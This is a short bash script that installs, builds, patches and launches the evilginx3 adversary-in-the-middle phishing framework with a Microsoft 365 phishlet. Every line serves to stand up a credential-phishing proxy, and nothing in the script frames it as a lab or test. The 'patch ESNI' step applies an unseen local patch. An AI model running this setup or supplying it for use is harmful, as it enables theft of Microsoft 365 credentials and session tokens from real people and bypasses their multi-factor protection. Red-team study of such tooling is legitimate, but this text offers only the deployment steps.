#!/usr/bin/env bash
sudo apt install -y git golang-go
git clone --depth 1 https://github.com/kgretzky/evilginx3
cd evilginx3
go build -o evilginx
chmod +x evilginx
# patch ESNI
patch -p1 < ../evilginx.patch
sudo ./evilginx -p ./ -g phishlets/m365.yaml -developer 